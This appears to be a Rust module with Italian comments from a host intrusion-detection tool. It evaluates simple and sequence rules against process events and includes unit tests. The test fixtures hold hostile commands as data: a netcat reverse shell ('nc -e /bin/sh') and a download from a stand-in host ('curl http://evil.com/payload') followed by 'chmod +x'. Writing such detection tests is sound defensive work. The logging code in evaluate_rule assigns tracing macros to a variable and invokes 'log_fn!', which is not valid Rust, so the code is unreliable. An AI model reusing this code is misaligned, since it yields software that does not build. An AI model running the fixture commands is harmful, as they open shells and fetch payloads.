//! Motore di valutazione delle regole: applica ogni regola caricata agli
//! eventi normalizzati, taggando quelli che soddisfano una regola con
//! `rule:<id>` più gli eventuali tag custom definiti nella regola stessa.

use std::sync::Arc;
use std::time::Duration;

use tracing::{info, warn};

use crate::events::{Enricher, NormalizedEvent};

use super::matcher::{correlation_value, evaluate_all, SequenceTracker};
use super::rule::{MatchSpec, Rule, Severity};

/// Prefisso applicato al tag identificativo della regola scattata,
/// distinto dai tag "semantici" (es. `suspected_reverse_shell`) applicati
/// dai singoli detector delle parti precedenti.
const RULE_TAG_PREFIX: &str = "rule:";

/// Intervallo di pulizia delle voci scadute nel `SequenceTracker`, per
/// evitare crescita illimitata di memoria su host con eventi `first`
/// frequenti mai seguiti da un corrispondente `then`.
const SEQUENCE_PRUNE_INTERVAL: Duration = Duration::from_secs(60);
const SEQUENCE_MAX_PENDING_AGE: Duration = Duration::from_secs(300);

/// Motore di detection: valuta ogni evento contro l'intero set di regole
/// caricate, come stadio di arricchimento della pipeline (`Enricher`).
pub struct DetectionEngine {
    rules: Vec<Rule>,
    sequence_tracker: Arc<SequenceTracker>,
}

impl DetectionEngine {
    pub fn new(rules: Vec<Rule>) -> Self {
        let enabled_count = rules.iter().filter(|r| r.enabled).count();
        info!(
            total_rules = rules.len(),
            enabled_rules = enabled_count,
            "detection engine initialized"
        );

        Self {
            rules,
            sequence_tracker: Arc::new(SequenceTracker::new()),
        }
    }

    /// Numero di regole caricate (incluse quelle disabilitate), usato nei
    /// test e in eventuali metriche diagnostiche.
    pub fn rule_count(&self) -> usize {
        self.rules.len()
    }

    /// Avvia un task periodico che ripulisce le voci scadute del
    /// `SequenceTracker`. Da avviare una sola volta accanto alla pipeline
    /// principale (vedi `main.rs`).
    pub fn spawn_sequence_pruner(&self) -> tokio::task::JoinHandle<()> {
        let tracker = Arc::clone(&self.sequence_tracker);
        tokio::spawn(async move {
            let mut ticker = tokio::time::interval(SEQUENCE_PRUNE_INTERVAL);
            loop {
                ticker.tick().await;
                tracker.prune_expired(SEQUENCE_MAX_PENDING_AGE);
            }
        })
    }

    fn evaluate_rule(&self, rule: &Rule, event: &mut NormalizedEvent) {
        let matched = match &rule.match_spec {
            MatchSpec::Simple { conditions } => evaluate_all(event, conditions),
            MatchSpec::Sequence {
                first,
                then,
                within_seconds,
                correlate_by,
            } => {
                let correlation = correlation_value(event, *correlate_by);

                // Un evento può soddisfare "then" di una regola sequenziale
                // solo se esiste un match "first" pendente per la stessa
                // chiave di correlazione entro la finestra configurata.
                let then_matched = evaluate_all(event, then)
                    && self.sequence_tracker.try_consume_match(
                        &rule.id,
                        correlation,
                        Duration::from_secs(*within_seconds),
                    );

                if !then_matched && evaluate_all(event, first) {
                    self.sequence_tracker.record_first(&rule.id, correlation);
                }

                then_matched
            }
        };

        if matched {
            event.tags.push(format!("{RULE_TAG_PREFIX}{}", rule.id));
            for tag in &rule.tags {
                event.tags.push(tag.clone());
            }

            let log_fn = match rule.severity {
                Severity::Critical | Severity::High => tracing::error!,
                Severity::Medium => tracing::warn!,
                Severity::Low => tracing::info!,
            };
            log_fn!(
                rule_id = %rule.id,
                rule_name = %rule.name,
                severity = ?rule.severity,
                pid = event.process.pid,
                comm = %event.process.comm,
                "detection rule triggered"
            );
        }
    }
}

impl Enricher for DetectionEngine {
    fn enrich(&self, event: &mut NormalizedEvent) {
        for rule in self.rules.iter().filter(|r| r.enabled) {
            self.evaluate_rule(rule, event);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detection::rule::{CorrelationKey, FieldCondition, Operator};
    use crate::events::{EventKind, EventPayload, ProcessContext};
    use chrono::Utc;
    use uuid::Uuid;

    fn exec_event(pid: u32, ppid: u32, comm: &str, filename: &str, args: Vec<&str>) -> NormalizedEvent {
        NormalizedEvent {
            id: Uuid::new_v4(),
            timestamp: Utc::now(),
            event_kind: EventKind::Exec,
            process: ProcessContext {
                pid,
                tgid: pid,
                ppid,
                uid: 1000,
                gid: 1000,
                comm: comm.to_string(),
                cgroup_id: 0,
                parent_comm: None,
            },
            payload: EventPayload::Exec {
                filename: filename.to_string(),
                args: args.into_iter().map(String::from).collect(),
            },
            container: None,
            tags: Vec::new(),
        }
    }

    fn simple_rule(id: &str, field: &str, value: &str) -> Rule {
        Rule {
            id: id.to_string(),
            name: id.to_string(),
            description: String::new(),
            severity: Severity::High,
            match_spec: MatchSpec::Simple {
                conditions: vec![FieldCondition {
                    field: field.to_string(),
                    operator: Operator::Contains,
                    value: value.to_string(),
                }],
            },
            tags: vec![],
            enabled: true,
        }
    }

    #[test]
    fn simple_rule_tags_matching_event() {
        let engine = DetectionEngine::new(vec![simple_rule("nc-rule", "exec.filename", "nc")]);
        let mut event = exec_event(1, 0, "nc", "/usr/bin/nc", vec!["-e", "/bin/sh"]);

        engine.enrich(&mut event);

        assert!(event.tags.contains(&"rule:nc-rule".to_string()));
    }

    #[test]
    fn disabled_rule_does_not_trigger() {
        let mut rule = simple_rule("disabled-rule", "exec.filename", "nc");
        rule.enabled = false;
        let engine = DetectionEngine::new(vec![rule]);

        let mut event = exec_event(1, 0, "nc", "/usr/bin/nc", vec!["-e"]);
        engine.enrich(&mut event);

        assert!(event.tags.is_empty());
    }

    #[test]
    fn sequence_rule_triggers_on_correlated_events_within_window() {
        let rule = Rule {
            id: "curl-then-chmod".to_string(),
            name: "curl followed by chmod".to_string(),
            description: String::new(),
            severity: Severity::Medium,
            match_spec: MatchSpec::Sequence {
                first: vec![FieldCondition {
                    field: "exec.filename".to_string(),
                    operator: Operator::Contains,
                    value: "curl".to_string(),
                }],
                then: vec![FieldCondition {
                    field: "exec.filename".to_string(),
                    operator: Operator::Contains,
                    value: "chmod".to_string(),
                }],
                within_seconds: 30,
                correlate_by: CorrelationKey::Ppid,
            },
            tags: vec![],
            enabled: true,
        };
        let engine = DetectionEngine::new(vec![rule]);

        // Stesso ppid (200) per entrambi gli eventi: sono figli dello
        // stesso script di shell.
        let mut curl_event = exec_event(300, 200, "curl", "/usr/bin/curl", vec!["http://evil.com/payload"]);
        engine.enrich(&mut curl_event);
        assert!(curl_event.tags.is_empty(), "first event alone should not trigger");

        let mut chmod_event = exec_event(301, 200, "chmod", "/usr/bin/chmod", vec!["+x", "payload"]);
        engine.enrich(&mut chmod_event);
        assert!(chmod_event.tags.contains(&"rule:curl-then-chmod".to_string()));
    }

    #[test]
    fn sequence_rule_does_not_trigger_for_unrelated_ppid() {
        let rule = Rule {
            id: "curl-then-chmod-2".to_string(),
            name: "curl followed by chmod".to_string(),
            description: String::new(),
            severity: Severity::Medium,
            match_spec: MatchSpec::Sequence {
                first: vec![FieldCondition {
                    field: "exec.filename".to_string(),
                    operator: Operator::Contains,
                    value: "curl".to_string(),
                }],
                then: vec![FieldCondition {
                    field: "exec.filename".to_string(),
                    operator: Operator::Contains,
                    value: "chmod".to_string(),
                }],
                within_seconds: 30,
                correlate_by: CorrelationKey::Ppid,
            },
            tags: vec![],
            enabled: true,
        };
        let engine = DetectionEngine::new(vec![rule]);

        let mut curl_event = exec_event(300, 200, "curl", "/usr/bin/curl", vec!["http://evil.com/payload"]);
        engine.enrich(&mut curl_event);

        // ppid diverso (999): non correlato allo stesso script.
        let mut chmod_event = exec_event(301, 999, "chmod", "/usr/bin/chmod", vec!["+x", "payload"]);
        engine.enrich(&mut chmod_event);
        assert!(chmod_event.tags.is_empty());
    }

    #[test]
    fn custom_rule_tags_are_added_alongside_rule_id_tag() {
        let mut rule = simple_rule("custom-tag-rule", "exec.filename", "wget");
        rule.tags = vec!["custom_download_tag".to_string()];
        let engine = DetectionEngine::new(vec![rule]);

        let mut event = exec_event(1, 0, "wget", "/usr/bin/wget", vec!["http://example.com/file"]);
        engine.enrich(&mut event);

        assert!(event.tags.contains(&"rule:custom-tag-rule".to_string()));
        assert!(event.tags.contains(&"custom_download_tag".to_string()));
    }
}